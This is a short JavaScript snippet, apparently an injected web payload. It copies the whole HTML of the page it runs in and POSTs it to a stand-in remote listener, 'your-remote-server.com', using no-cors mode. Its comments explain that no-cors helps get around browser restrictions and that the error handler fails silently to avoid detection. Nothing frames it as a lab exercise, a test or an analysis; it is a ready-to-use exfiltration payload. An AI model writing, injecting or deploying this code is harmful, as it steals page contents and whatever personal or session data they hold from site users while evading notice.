(function() {
    // 1. Capture the entire HTML structure of the page
    const pageContent = document.documentElement.outerHTML;

    // 2. Use fetch to send the data to your remote listener
    fetch('https://your-remote-server.com', {
      method: 'POST',
      mode: 'no-cors', // Helps bypass some basic browser restrictions
      body: pageContent
    })
    .catch(err => console.log('Silently failing to avoid detection'));
  })();
